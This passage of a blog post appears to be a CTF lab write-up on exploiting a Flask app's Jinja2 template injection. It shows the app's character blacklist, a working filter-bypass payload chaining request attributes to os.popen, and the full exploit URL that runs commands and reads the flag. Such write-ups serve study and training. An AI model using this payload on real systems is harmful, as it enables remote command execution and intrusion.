</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> any(char <span style=color:#f92672>in</span> directory <span style=color:#66d9ef>for</span> char <span style=color:#f92672>in</span> invalid_chars):  
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#34;error.html&#34;</span>, title<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;error&#34;</span>, error<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;invalid directory&#34;</span>), <span style=color:#ae81ff>400</span>
</span></span></code></pre></div><p><img loading=lazy src=https://miro.medium.com/v2/resize:fit:700/1*700MrKoEPGKbv9MKkYGzKg.png></p><h1 id=bypassing-the-blacklist>Bypassing the Blacklist<a hidden class=anchor aria-hidden=true href=#bypassing-the-blacklist>#</a></h1><p>To bypass this filter, I searched for alternative approaches and found a method in this <a href=https://0day.work/jinja2-template-injection-filter-bypasses/>article</a></p><p>The idea was to use another input parameter to read the payload, this approach involved crafting a payload that would bypass the filter</p><pre tabindex=0><code>
+---------------------------+  
|       Main Input          |  
|  (Filtered by blacklist)  |  
+---------------------------+  
            |  
            v  
+---------------------------+  
|       Alternative         |  
|        Input Parameter     |  
|    (Not filtered)         |  
+---------------------------+  
            |  
            v  
+---------------------------+  
|   Payload Injection       |  
|   (Bypassing the filter)  |  
+---------------------------+  
            |  
            v  
+---------------------------+  
|       Final Output        |  
|  (Executed Command Result)|  
+---------------------------+
</code></pre><p>And thatâ€™s the payload I came with</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&amp;#123;%with output=((((request|attr(&#39;application&#39;))|attr(request|attr(&amp;quot;args&amp;quot;)|attr(&amp;quot;get&amp;quot;)(&amp;#39;globals&amp;#39;)))|attr(request|attr(&amp;quot;args&amp;quot;)|attr(&amp;quot;get&amp;quot;)(&amp;#39;getitem&amp;#39;)))(request|attr(&amp;quot;args&amp;quot;)|attr(&amp;quot;get&amp;quot;)(&amp;#39;builtins&amp;#39;))|attr(request|attr(&amp;quot;args&amp;quot;)|attr(&amp;quot;get&amp;quot;)(&amp;#39;getitem&amp;#39;)))(request|attr(&amp;quot;args&amp;quot;)|attr(&amp;quot;get&amp;quot;)(&amp;#39;import&amp;#39;)))(&amp;#39;os&amp;#39;)|attr(&amp;#39;popen&amp;#39;)(request|attr(&amp;quot;args&amp;quot;)|attr(&amp;quot;get&amp;quot;)(&amp;#39;cmd&amp;#39;))|attr(&amp;#39;read&amp;#39;)()%&amp;#125;&amp;#123;%print(output)%&amp;#125;&amp;#123;%endwith%&amp;#125;<span style=color:#960050;background-color:#1e0010>&amp;</span>globals=__globals__<span style=color:#960050;background-color:#1e0010>&amp;</span>getitem=__getitem__<span style=color:#960050;background-color:#1e0010>&amp;</span>builtins=__builtins__<span style=color:#960050;background-color:#1e0010>&amp;</span>import=__import__<span style=color:#960050;background-color:#1e0010>&amp;</span>cmd=
</span></span></code></pre></div><p>To bypass the filter, I crafted a payload that cleverly navigates around the blacklisted characters</p><p><code>invalid_chars = ["{{", "}}", ".", "_", "[", "]","\\", "x"]</code></p><p>I replaced blacklisted characters and patterns with alternatives:</p><ul><li><code>**{{**</code> was replaced with <code>**{%**</code>.</li><li><code>**}}**</code> was replaced with <code>**%}**</code>.</li><li><code>**.**</code> was bypassed by using attribute chaining through the <code>request</code> object.</li><li><code>**_**</code> was avoided by using alternative attribute names and methods.</li><li><code>**[**</code> <strong>and</strong> <code>**]**</code> were substituted with attribute access via <code>attr()</code>.</li><li><code>**\\**</code> and <code>**x**</code> were sidestepped by constructing the payload in a way that didn&rsquo;t require these characters.</li></ul><p>I navigated through the <code>request</code> attributes to access Pythonâ€™s <code>globals</code> and <code>builtins</code> dictionaries, using the <code>import</code> function, I imported the <code>os</code> module and used its <code>popen</code> method to OS execute commands</p><p>â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” -</p><p>And Successfully executed the <code>id</code> command, confirming root access</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>http://0.0.0.0:3000/home?token=&lt;&gt;&amp;directory=&amp;#123;%with output=((((request|attr(&#39;application&#39;))|attr(request|attr(&#34;args&#34;)|attr(&#34;get&#34;)(&#39;globals&#39;)))|attr(request|attr(&#34;args&#34;)|attr(&#34;get&#34;)(&#39;getitem&#39;)))(request|attr(&#34;args&#34;)|attr(&#34;get&#34;)(&#39;builtins&#39;))|attr(request|attr(&#34;args&#34;)|attr(&#34;get&#34;)(&#39;getitem&#39;)))(request|attr(&#34;args&#34;)|attr(&#34;get&#34;)(&#39;import&#39;))(&#39;os&#39;)|attr(&#39;popen&#39;)(request|attr(&#34;args&#34;)|attr(&#34;get&#34;)(&#39;cmd&#39;))|attr(&#39;read&#39;)()%&amp;#125;&amp;#123;%print(output)%&amp;#125;&amp;#123;%endwith%&amp;#125;&amp;globals=__globals__&amp;getitem=__getitem__&amp;builtins=__builtins__&amp;import=__import__&amp;cmd=id
</span></span></span></code></pre></div><p><img loading=lazy src=https://miro.medium.com/v2/resize:fit:700/1*Xl5B59r9fgJGMBkPuPNcLg.png></p><p>Nice, Root:)</p><p>Ran <code>ls -lah /</code> to list the system files, which revealed the flag&rsquo;s location</p><p><img loading=lazy src=https://miro.medium.com/v2/resize:fit:695/1*0Kw-zjh-CPKYvW8O7ym5kQ.png></p><p>nice flag is there, lets use <code>cat</code>to read the flag from the file, successfully retrieving it</p><p><img loading=lazy src=https://miro.medium.com/v2/resize:fit:700/1*TCdBFtrQgv36-ftOkivS8g.png></p><p><img loading=lazy src=https://miro.medium.com/v2/resize:fit:700/1*A3zR-rBM2mstqTg5zxvU8w.png></p><p>And Thatâ€™s it</p><p>Bye UwU</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://www.mindpatch.net/tags/htb/>HTB</a></li><li><a href=https://www.mindpatch.net/tags/ctf/>CTF</a></li><li><a href=https://www.mindpatch.net/tags/flask/>Flask</a></li><li><a href=https://www.mindpatch.net/tags/nextjs/>NextJS</a></li><li><a href=https://www.mindpatch.net/tags/web-security/>Web Security</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://www.mindpatch.net/>@MindPatch</a></span> Â·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>